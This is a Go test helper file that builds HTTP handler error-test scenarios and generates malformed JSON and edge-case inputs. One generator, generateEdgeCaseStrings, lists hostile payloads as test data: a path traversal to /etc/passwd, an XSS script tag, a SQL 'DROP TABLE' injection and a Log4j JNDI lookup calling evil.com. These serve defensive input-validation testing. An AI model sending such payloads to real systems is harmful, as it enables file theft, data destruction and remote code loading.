package main

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"testing"
)

// ErrorTestPattern defines a systematic approach to testing error conditions
type ErrorTestPattern struct {
	Name           string
	Description    string
	ExpectedStatus int
	Setup          func(t *testing.T) interface{}
	Execute        func(t *testing.T, setupData interface{}) HTTPTestRequest
	Validate       func(t *testing.T, w *httptest.ResponseRecorder, setupData interface{})
	Cleanup        func(setupData interface{})
}

// HandlerTestSuite provides a comprehensive test framework for HTTP handlers
type HandlerTestSuite struct {
	HandlerName string
	Handler     http.HandlerFunc
	BaseURL     string
}

// RunErrorTests executes a suite of error condition tests
func (suite *HandlerTestSuite) RunErrorTests(t *testing.T, patterns []ErrorTestPattern) {
	for _, pattern := range patterns {
		t.Run(fmt.Sprintf("%s_%s", suite.HandlerName, pattern.Name), func(t *testing.T) {
			// Setup
			var setupData interface{}
			if pattern.Setup != nil {
				setupData = pattern.Setup(t)
			}

			// Cleanup
			if pattern.Cleanup != nil {
				defer pattern.Cleanup(setupData)
			}

			// Execute
			req := pattern.Execute(t, setupData)
			w := executeHandler(suite.Handler, req)

			// Validate status code
			if w.Code != pattern.ExpectedStatus {
				t.Errorf("Expected status %d, got %d. Response: %s",
					pattern.ExpectedStatus, w.Code, w.Body.String())
			}

			// Custom validation
			if pattern.Validate != nil {
				pattern.Validate(t, w, setupData)
			}
		})
	}
}

// TestScenarioBuilder provides a fluent interface for building test scenarios
type TestScenarioBuilder struct {
	patterns []ErrorTestPattern
}

// NewTestScenarioBuilder creates a new test scenario builder
func NewTestScenarioBuilder() *TestScenarioBuilder {
	return &TestScenarioBuilder{
		patterns: []ErrorTestPattern{},
	}
}

// AddInvalidJSON adds invalid JSON test pattern
func (b *TestScenarioBuilder) AddInvalidJSON(method, path string) *TestScenarioBuilder {
	b.patterns = append(b.patterns, ErrorTestPattern{
		Name:           "InvalidJSON",
		Description:    "Test handler with malformed JSON input",
		ExpectedStatus: http.StatusBadRequest,
		Setup:          nil,
		Execute: func(t *testing.T, setupData interface{}) HTTPTestRequest {
			return HTTPTestRequest{
				Method: method,
				Path:   path,
				Body:   `{"invalid": "json"`, // Malformed JSON
			}
		},
		Validate: func(t *testing.T, w *httptest.ResponseRecorder, setupData interface{}) {
			assertErrorResponse(t, w, http.StatusBadRequest, "")
		},
	})
	return b
}

// AddMissingRequiredField adds missing required field test pattern
func (b *TestScenarioBuilder) AddMissingRequiredField(method, path, fieldName string) *TestScenarioBuilder {
	b.patterns = append(b.patterns, ErrorTestPattern{
		Name:           fmt.Sprintf("MissingRequired_%s", fieldName),
		Description:    fmt.Sprintf("Test handler with missing required field: %s", fieldName),
		ExpectedStatus: http.StatusBadRequest,
		Setup:          nil,
		Execute: func(t *testing.T, setupData interface{}) HTTPTestRequest {
			return HTTPTestRequest{
				Method: method,
				Path:   path,
				Body:   map[string]interface{}{}, // Empty body missing required field
			}
		},
	})
	return b
}

// AddInvalidTaskType adds invalid task type test pattern
func (b *TestScenarioBuilder) AddInvalidTaskType(path string) *TestScenarioBuilder {
	b.patterns = append(b.patterns, ErrorTestPattern{
		Name:           "InvalidTaskType",
		Description:    "Test handler with invalid task type",
		ExpectedStatus: http.StatusBadRequest,
		Setup:          nil,
		Execute: func(t *testing.T, setupData interface{}) HTTPTestRequest {
			return HTTPTestRequest{
				Method: "POST",
				Path:   path,
				Body: map[string]interface{}{
					"type":      "invalid-type",
					"operation": "generator",
					"target":    "test",
				},
			}
		},
	})
	return b
}

// AddInvalidOperation adds invalid operation test pattern
func (b *TestScenarioBuilder) AddInvalidOperation(path string) *TestScenarioBuilder {
	b.patterns = append(b.patterns, ErrorTestPattern{
		Name:           "InvalidOperation",
		Description:    "Test handler with invalid operation",
		ExpectedStatus: http.StatusBadRequest,
		Setup:          nil,
		Execute: func(t *testing.T, setupData interface{}) HTTPTestRequest {
			return HTTPTestRequest{
				Method: "POST",
				Path:   path,
				Body: map[string]interface{}{
					"type":      "resource",
					"operation": "invalid-operation",
					"target":    "test",
				},
			}
		},
	})
	return b
}

// AddNonExistentTask adds non-existent task test pattern
func (b *TestScenarioBuilder) AddNonExistentTask(method, path string) *TestScenarioBuilder {
	b.patterns = append(b.patterns, ErrorTestPattern{
		Name:           "NonExistentTask",
		Description:    "Test handler with non-existent task ID",
		ExpectedStatus: http.StatusNotFound,
		Setup:          nil,
		Execute: func(t *testing.T, setupData interface{}) HTTPTestRequest {
			return HTTPTestRequest{
				Method:  method,
				Path:    path,
				URLVars: map[string]string{"id": "non-existent-task-id"},
			}
		},
	})
	return b
}

// AddEmptyBody adds empty body test pattern
func (b *TestScenarioBuilder) AddEmptyBody(method, path string) *TestScenarioBuilder {
	b.patterns = append(b.patterns, ErrorTestPattern{
		Name:           "EmptyBody",
		Description:    "Test handler with empty request body",
		ExpectedStatus: http.StatusBadRequest,
		Setup:          nil,
		Execute: func(t *testing.T, setupData interface{}) HTTPTestRequest {
			return HTTPTestRequest{
				Method: method,
				Path:   path,
				Body:   "",
			}
		},
	})
	return b
}

// AddInvalidQueryParam adds invalid query parameter test pattern
func (b *TestScenarioBuilder) AddInvalidQueryParam(path, paramName, invalidValue string) *TestScenarioBuilder {
	b.patterns = append(b.patterns, ErrorTestPattern{
		Name:           fmt.Sprintf("InvalidQueryParam_%s", paramName),
		Description:    fmt.Sprintf("Test handler with invalid query parameter: %s", paramName),
		ExpectedStatus: http.StatusBadRequest,
		Setup:          nil,
		Execute: func(t *testing.T, setupData interface{}) HTTPTestRequest {
			return HTTPTestRequest{
				Method:      "GET",
				Path:        path,
				QueryParams: map[string]string{paramName: invalidValue},
			}
		},
	})
	return b
}

// AddCustom adds a custom test pattern
func (b *TestScenarioBuilder) AddCustom(pattern ErrorTestPattern) *TestScenarioBuilder {
	b.patterns = append(b.patterns, pattern)
	return b
}

// Build returns the configured test patterns
func (b *TestScenarioBuilder) Build() []ErrorTestPattern {
	return b.patterns
}

// Common test data generators

// generateInvalidJSONBodies returns various forms of invalid JSON
func generateInvalidJSONBodies() []string {
	return []string{
		`{"invalid": "json"`,        // Missing closing brace
		`{invalid json}`,             // Not proper JSON
		`{"key": }`,                  // Missing value
		`{"key": "value",}`,          // Trailing comma
		``,                           // Empty string
		`null`,                       // Just null
		`{"key": undefined}`,         // Undefined value
		`{'key': 'value'}`,           // Single quotes instead of double
	}
}

// generateEdgeCaseStrings returns edge case string values
func generateEdgeCaseStrings() []string {
	return []string{
		"",                                  // Empty string
		" ",                                 // Single space
		"   ",                               // Multiple spaces
		"\n",                                // Newline
		"\t",                                // Tab
		"a",                                 // Single character
		string(make([]byte, 10000)),         // Very long string
		"../../../etc/passwd",               // Path traversal attempt
		"<script>alert('xss')</script>",     // XSS attempt
		"'; DROP TABLE tasks; --",           // SQL injection attempt
		"${jndi:ldap://evil.com/a}",         // Log4j style injection
		"\x00",                              // Null byte
		"unicode: \u0000 \uffff",            // Unicode characters
		"emoji: 😀🎉🚀",                     // Emoji
	}
}

// generateEdgeCaseNumbers returns edge case numeric values
func generateEdgeCaseNumbers() []interface{} {
	return []interface{}{
		0,
		-1,
		-9999999,
		9999999,
		1.5,
		-1.5,
		"not-a-number",
		"123abc",
		nil,
	}
}
